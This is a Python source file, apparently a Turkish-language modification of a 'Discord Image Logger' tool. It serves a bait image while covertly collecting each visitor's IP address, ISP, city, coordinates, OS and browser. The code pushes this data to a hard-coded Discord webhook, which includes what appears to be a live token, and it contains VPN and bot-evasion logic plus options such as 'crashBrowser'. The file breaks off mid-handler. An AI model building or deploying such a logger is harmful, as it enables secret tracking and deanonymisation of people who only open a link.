# Discord Image Logger

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "oylesine bi image logger"
__version__ = "v2.0"
__author__ = "foaqen"

config = {
    "webhook": "https://discordapp.com/api/webhooks/1468234580841463950/3o-pEa4iwukhRiIMlbowWVcuRC_YBtjzIex7OsoICZeL50Q7YZ5I7oON9OCOr1znlMAT",
    "image": "data:image/jpeg;base64,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", 
    "imageArgument": True,

    "username": "Logger Agent", 
    "color": 0x00FFFF,

    "crashBrowser": False, 
    "accurateLocation": False,

    "message": {
        "doMessage": False, 
        "message": "Yeni bir kişi tıkladı.",
        "richMessage": True,
    },

    "vpnCheck": 1,
                # 0 = VPN kontrolünü kapat
                # 1 = VPN tespit edildiği zaman beni etiketleme
                # 2 = VPN tespit edildiği zaman bildirme

    "linkAlerts": False, 
    "buggedImage": True,

    "antiBot": 1,
    

    "redirect": {
        "redirect": False,
        "page": "https://example.org"
    },


}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Hata!",
            "color": config["color"],
            "description": f"IP adresi LOG'lanırken bir hata oluştu!\n\n**Hata:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Bağlantı Gönderildi",
            "color": config["color"],
            "description": f"IPLogger bağlantısı bir sohbete gönderildi!\nBirisi tıkladığında bilgilendirileceksiniz.\n\n**Bitiş Noktası:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - Birisi Tıkladı!",
            "color": config["color"],
            "description": f"""**Bir kullanıcı orijinal resmi fotoğrafı açtı**

**Bitiş Noktası:** `{endpoint}`
            
**IP Adresi:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Sağlayıcı:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Ülke:** `{info['country'] if info['country'] else 'Unknown'}`
> **Bölge:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **Şehir:** `{info['city'] if info['city'] else 'Unknown'}`
> **Koordinat:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Saat Dilimi:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobil:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**Bilgisayar Bilgileri:**
> **İşletim Sistemi:** `{os}`
> **Tarayıcı:** `{browser}`

**Aracı:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

}

# By DeKrypt | https://github.com/dekrypted

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
